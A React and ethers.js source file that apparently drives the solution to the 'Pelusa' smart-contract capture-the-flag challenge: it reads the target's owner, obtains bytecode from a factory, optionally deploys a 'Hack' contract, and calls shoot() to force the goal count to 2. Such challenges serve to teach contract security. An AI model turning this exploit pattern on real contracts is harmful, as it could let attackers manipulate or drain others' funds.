import { ethers } from "ethers";
import React from "react";

const PELUSA_CONTRACT_ADDRESS = "0xB065ba2ae650cb82Fa44d32FC40853B248fF33cd";
const PELUSA_ABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "goals",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "isGoal",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "passTheBall",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "shoot",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];
const FACTORY_CONTRACT_ADDRESS = "0x8f3c16E9618E79bceB1295be22A5AFd4fE9aa379";
const FACTORY_ABI = [
  {
    "inputs": [],
    "name": "_salt",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "bytes",
        "name": "bytecode",
        "type": "bytes"
      }
    ],
    "name": "deploy",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "finaladdr",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_target",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "_owner",
        "type": "address"
      }
    ],
    "name": "getBytecode",
    "outputs": [
      {
        "internalType": "bytes",
        "name": "",
        "type": "bytes"
      }
    ],
    "stateMutability": "pure",
    "type": "function"
  }
];


const App = () => {
const StartProcess = async () => {
try {
console.log("Begin");
const { ethereum } = window;
if (ethereum) {
  console.log("Going to pop wallet to connect")
  const provider = new ethers.providers.Web3Provider(ethereum);
  const signer = provider.getSigner();
  const pelusaconnectedContract = new ethers.Contract(PELUSA_CONTRACT_ADDRESS, PELUSA_ABI, signer);
  const factoryconnectedContract = new ethers.Contract(FACTORY_CONTRACT_ADDRESS, FACTORY_ABI, signer);
  const accounts = await ethereum.request({ method:"eth_requestAccounts" });
  console.log("Connected", accounts[0]);

  let owner = await pelusaconnectedContract.owner();
  console.log("Owner :", owner)

  let initialscore = await pelusaconnectedContract.goals();
  console.log("Initial Score :", initialscore)

  let bytecode = await factoryconnectedContract.getBytecode(PELUSA_CONTRACT_ADDRESS,owner);
  console.log("Bytecode: ",bytecode);

  //Uncomment these lines👇 when you want to freshly deploy all the contracts otherwise these lines will cause an error

  // let deployHack = await factoryconnectedContract.deploy(bytecode);
  // console.log("Deploying Hack on specified address: Process started");
  // await deployHack.wait();
  // console.log("Deploying Hack on specified address: Process finished");

  let addr = await factoryconnectedContract.finaladdr();
  console.log("Contract address where Hack.sol is deployed: ",addr);
 
  let changeValueOfGoal = await pelusaconnectedContract.shoot();
  console.log("Changing value of goal to 2: Process started");
  await changeValueOfGoal.wait();
  console.log("Changing value of goal to 2: Process finished");

  let finalscore = await pelusaconnectedContract.goals();
  console.log("Final Score :", finalscore)

}
else {
console.log("Ethereum object doesn't exist!");
}
} catch (error) {
console.log(error)
}
}
return (
<div>
<button onClick={() => StartProcess().then(/* handle promise here */)}>Click this and see the challenge being completed in console</button>
</div>
);
};
export default App;
